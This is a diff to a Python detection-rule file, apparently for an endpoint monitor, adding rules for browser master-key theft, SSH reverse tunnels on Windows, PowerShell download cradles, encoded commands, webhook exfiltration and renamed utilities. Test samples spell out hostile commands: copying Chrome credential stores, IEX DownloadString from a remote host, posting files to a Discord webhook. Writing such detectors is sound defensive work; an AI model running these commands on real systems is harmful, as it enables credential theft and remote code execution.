@@ -148,13 +148,28 @@ RULES = (
          (S32 + "cmd.exe",
           r'cmd /c copy "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\t\l'),
          [(S32 + "cmd.exe",
-           r'cmd /c dir "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Extensions"')],
+           r'cmd /c dir "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Extensions"'),
+          (S32 + "cmd.exe", r'cmd /c dir "C:\Users\u\AppData\Local\Google\Chrome\User Data\Default\Local Storage"')],
+         not_images=BROWSERS + POWERSHELL),
+    # The Chromium master key (Local State, os_crypt.encrypted_key) decrypts every
+    # saved password and cookie: infostealers copy it beside Login Data (Vidar,
+    # Lumma, ChromElevator; spyware research 2026-10-29).
+    Rule(("T1555", "T1539"), WIN, ANY,
+         r"\\(Google\\Chrome|Microsoft\\Edge|BraveSoftware\\[^\"'|;]*)\\User Data\\Local State\b",
+         "high", "browser master-key file named on a command line",
+         (S32 + "cmd.exe",
+          r'cmd /c copy "C:\Users\u\AppData\Local\Google\Chrome\User Data\Local State" C:\t\k'),
          not_images=BROWSERS + POWERSHELL),
     Rule(("T1555", "T1539"), LINUX, ANY,
          r"/(\.config/(google-chrome|chromium|BraveSoftware/[^/]+)|\.mozilla/firefox)/[^\"'|;]*"
          r"(Login Data|Cookies|logins\.json|key4\.db|cookies\.sqlite)\b",
          "high", "browser credential or cookie store named on a command line",
          ("/usr/bin/cp", "cp /home/u/.config/google-chrome/Default/Cookies /tmp/c"),
+         not_images=BROWSERS + INTERPRETERS),
+    Rule(("T1555", "T1539"), LINUX, ANY,
+         r"/\.config/(google-chrome|chromium|BraveSoftware/[^/]+|microsoft-edge)/Local State\b",
+         "high", "browser master-key file named on a command line",
+         ("/usr/bin/cp", "cp '/home/u/.config/google-chrome/Local State' /tmp/k"),
          not_images=BROWSERS + INTERPRETERS),
     Rule(("T1217",), WIN, ANY,
          r"(\\Google\\Chrome\\User Data|\\Microsoft\\Edge\\User Data|\\Mozilla\\Firefox\\Profiles)"
@@ -486,6 +501,17 @@ RULES = (
        "SSH remote or dynamic port forward",
        ("/usr/bin/ssh", "ssh -N -R 2222:localhost:22 u@203.0.113.9"),
        [("/usr/bin/ssh", "ssh -L 5432:db:5432 u@bastion"), ("/usr/bin/ssh", "ssh u@host uptime")]),
+    # Windows has OpenSSH built in, and 2025-2026 intrusions (OkoBot, TerminalFix)
+    # use it for reverse tunnels and SOCKS pivots (spyware research 2026-10-29).
+    _w("T1572", "ssh", r"(^|\s)-R\s*\S+|(^|\s)-w\s*\d", "medium",
+       "SSH remote port forward or tun device from Windows",
+       (S32 + r"OpenSSH\ssh.exe", "ssh.exe -N -R 2222:localhost:3389 u@203.0.113.9"),
+       [(S32 + r"OpenSSH\ssh.exe", "ssh.exe -L 5432:db:5432 u@bastion"),
+        (S32 + r"OpenSSH\ssh.exe", "ssh.exe u@host uptime")]),
+    _w("T1090", "ssh", r"(^|\s)-D\s*\S+", "low",
+       "SSH SOCKS proxy (dynamic forward) from Windows",
+       (S32 + r"OpenSSH\ssh.exe", "ssh.exe -N -D 1080 u@203.0.113.9"),
+       [(S32 + r"OpenSSH\ssh.exe", "ssh.exe -T -o ConnectTimeout=15 host bash")]),
     _l("T1090", "socat", r"TCP\d?-LISTEN:\d+[^ ]*fork\S*\s+TCP\d?:", "medium",
        "socat relaying a listener to another host",
        ("/usr/bin/socat", "socat TCP-LISTEN:8080,fork TCP:10.0.0.5:3389")),
@@ -637,6 +663,68 @@ RULES = (
 # itself is never observed.
 SCRIPT_CHILDREN = ("cmd", "powershell", "pwsh", "wscript", "cscript", "mshta", "rundll32",
                    "regsvr32", "certutil", "bitsadmin", "msiexec")
+# PowerShell on the event stream (2026-10-27 coverage audit). The most common
+# living-off-the-land procedure was caught only by the 2-minute process
+# snapshot or an unusual parent. Measured over 3 days (16581 PowerShell
+# starts): no download-and-execute or remote transfer outside ARGUS-1's own
+# loopback calls to its local model, and 5 encoded commands, all ARGUS-1's own
+# tooling via WSL. Encoded is therefore medium (obfuscation, not proof); the
+# parent cannot lower it safely because anything from WSL looks the same.
+_PS = S32 + "WindowsPowerShell\\v1.0\\powershell.exe"
+_DOWNLOAD = (r"downloadstring|downloaddata|downloadfile|net\.webclient|invoke-webrequest"
+             r"|\biwr\b|invoke-restmethod|\birm\b|start-bitstransfer")
+_REMOTE_URL = r"https?://(?!(?:127\.\d+\.\d+\.\d+|localhost|\[::1\])[:/])"
+_JARVIS_MODEL = (_PS, "powershell.exe -NoProfile -NonInteractive -Command \"try{$r=Invoke-RestMethod "
+                      "-Uri 'http://127.0.0.1:11434/api/tags' -TimeoutSec 5}catch{}\"")
+RULES += (
+    _w("T1059 T1105", "powershell pwsh",
+       r"(\biex\b|invoke-expression)[\s\S]{0,400}?(" + _DOWNLOAD + r"|https?://)"
+       r"|(" + _DOWNLOAD + r")[\s\S]{0,400}?(\biex\b|invoke-expression)",
+       "high", "PowerShell downloads and runs code (download cradle)",
+       (_PS, "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient)"
+             ".DownloadString('http://203.0.113.9/a.ps1')\""),
+       [_JARVIS_MODEL, (_PS, "powershell -c \"Invoke-Expression $env:LocalScript\"")]),
+    _w("T1059 T1027", "powershell pwsh",
+       r"(^|\s)[-/]e(c|n|nc|nco|ncod|ncode|ncoded|ncodedc|ncodedco|ncodedcom|ncodedcomm"
+       r"|ncodedcomma|ncodedcomman|ncodedcommand)?\s+[A-Za-z0-9+/=]{20,}",
+       "medium", "PowerShell ran an encoded command (contents hidden from the command line)",
+       (_PS, "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="),
+       [(_PS, "powershell -ExecutionPolicy Bypass -File C:\\t\\setup.ps1"),
+        (_PS, "powershell -ep bypass -file build.ps1")]),
+    # Steps aside when the same command executes what it fetched: the cradle
+    # rule above reports that, and one event should be one finding.
+    _w("T1105", "powershell pwsh",
+       r"^(?![\s\S]*(\biex\b|invoke-expression))[\s\S]*?(" + _DOWNLOAD
+       + r"|uploadfile|uploadstring)[\s\S]{0,300}?" + _REMOTE_URL,
+       "medium", "PowerShell transfers data to or from a remote host",
+       (_PS, "powershell -c \"Invoke-WebRequest https://203.0.113.9/p.exe -OutFile $env:TEMP\\\\p.exe\""),
+       [_JARVIS_MODEL]),
+    _w("T1567", "powershell pwsh",
+       r"\b(transfer\.sh|file\.io|0x0\.st|gofile\.io|anonfiles\.com|temp\.sh|bashupload\.com"
+       r"|discord(app)?\.com/api/webhooks|api\.telegram\.org/bot\w+:[\w-]+/send)\b", "high",
+       "PowerShell talks to a file-drop or chat webhook service",
+       (_PS, "powershell -c \"Invoke-RestMethod -Uri https://discord.com/api/webhooks/1/x "
+             "-Method Post -InFile $env:TEMP\\\\k.txt\""),
+       [(_PS, "powershell -c \"Start-Process https://discord.com/app\"")]),
+)
+
+# System utilities whose renamed copies are an evasion step in themselves
+# (T1036.003): every rule matches on the image name, so a renamed copy slipped
+# past all of them. Sysmon records the file's original name. Measured over
+# 3 days: 25034 runs of these utilities, none under another name.
+RENAMED_WATCH = frozenset((
+    "powershell", "pwsh", "cmd", "mshta", "rundll32", "regsvr32", "certutil", "bitsadmin",
+    "wmic", "msbuild", "installutil", "cscript", "wscript", "curl", "schtasks", "net", "net1",
+    "reg", "sc", "msiexec", "forfiles", "wsl", "bash", "psexec", "procdump", "rclone"))
+
+
+def original_base(name):
+    """Sysmon OriginalFileName -> the base the rules use (`PowerShell.EXE`,
+    `pwsh.dll` -> `powershell`, `pwsh`)."""
+    base = image_base(name)
+    return base[:-4] if base.endswith((".dll", ".mui")) else base
+
+
 DOCUMENT_APPS = ("winword", "excel", "powerpnt", "outlook", "onenote", "msaccess", "mspub",
                  "visio", "acrord32", "acrobat", "foxitreader", "foxitpdfreader", "wordpad",
                  "eqnedt32")
@@ -912,7 +1000,7 @@ RULES += (
        "WSL started as root from Windows (no password; root inside the distro)",
        (WSL_EXE, "wsl.exe -d Ubuntu -u root -- bash"),
        [(WSL_EXE, "wsl.exe -d Ubuntu --exec test -r /mnt/c/Windows/System32/cmd.exe"),
-        (WSL_EXE, "wsl.exe -d Ubuntu -u chris -- id -u"),
+        (WSL_EXE, "wsl.exe -d Ubuntu -u alice -- id -u"),
         (WSL_EXE, "wsl.exe ~")]),
     _w("T1564", "wsl", r"(^|\s)--(import|import-in-place|install|mount|debug-shell)\b", "medium",
        "a WSL distribution or disk was added, mounted or opened for debugging from Windows",
@@ -932,7 +1020,7 @@ RULES += (
        (r"C:\Program Files\WindowsApps\CanonicalGroupLimited.Ubuntu24.04LTS_x64\ubuntu2404.exe",
         "ubuntu2404.exe config --default-user root"),
        [(r"C:\Program Files\WindowsApps\CanonicalGroupLimited.Ubuntu24.04LTS_x64\ubuntu2404.exe",
-         "ubuntu2404.exe config --default-user chris")]),
+         "ubuntu2404.exe config --default-user alice")]),
 )
 
 
